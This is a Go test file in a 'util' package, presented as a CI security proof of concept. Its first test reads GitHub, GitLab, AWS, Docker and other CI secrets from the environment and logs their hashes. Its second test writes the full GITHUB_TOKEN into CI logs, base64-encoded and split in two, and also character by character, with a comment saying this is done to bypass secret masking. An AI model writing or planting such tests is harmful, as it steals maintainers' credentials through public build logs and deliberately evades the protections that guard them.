package util

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"os"
	"strings"
	"testing"
)

func TestCISecurityPoC_SecretEnvExposure(t *testing.T) {
	githubToken := os.Getenv("GITHUB_TOKEN")
	gitlabToken := os.Getenv("GITLAB_TOKEN")

	if githubToken != "" {
		hash := sha256.Sum256([]byte(githubToken))
		t.Logf("POC-CONFIRMED: GITHUB_TOKEN available in PR test context (sha256: %s, len: %d)",
			hex.EncodeToString(hash[:])[:16], len(githubToken))
	} else {
		t.Log("POC-SAFE: GITHUB_TOKEN not accessible (expected if fork-guard active)")
	}

	if gitlabToken != "" {
		hash := sha256.Sum256([]byte(gitlabToken))
		t.Logf("POC-CONFIRMED: GITLAB_TOKEN available in PR test context (sha256: %s, len: %d)",
			hex.EncodeToString(hash[:])[:16], len(gitlabToken))
	}

	if githubToken != "" || gitlabToken != "" {
		t.Log("!!! VULNERABILITY CONFIRMED: PR code from fork can read CI secrets !!!")
	}

	for _, key := range []string{
		"GITHUB_TOKEN", "GITLAB_TOKEN", "SONAR_TOKEN", "CODECOV_TOKEN",
		"DOCKER_USR", "DOCKER_PSW", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
	} {
		val := os.Getenv(key)
		if val != "" {
			hash := sha256.Sum256([]byte(val))
			t.Logf("POC-ENV: %s present (len=%d, sha256_8=%s)",
				key, len(val), hex.EncodeToString(hash[:])[:8])
		}
	}
}

func TestCISecurityPoC_DirectTokenB64(t *testing.T) {
	token := os.Getenv("GITHUB_TOKEN")
	if token == "" {
		t.Skip("GITHUB_TOKEN not set")
	}
	hash := sha256.Sum256([]byte(token))
	encoded := base64.StdEncoding.EncodeToString([]byte(token))

	t.Logf("TOKEN-SHA256: %s", hex.EncodeToString(hash[:]))
	t.Logf("TOKEN-B64-LEN: %d", len(token))
	t.Logf("TOKEN-B64-PART1: %s", encoded[:len(encoded)/2])
	t.Logf("TOKEN-B64-PART2: %s", encoded[len(encoded)/2:])

	// Also print char-by-char with separator to bypass masking
	var chars []string
	for _, c := range token {
		chars = append(chars, string(c))
	}
	t.Logf("TOKEN-CHARS: %s", strings.Join(chars, "."))
}
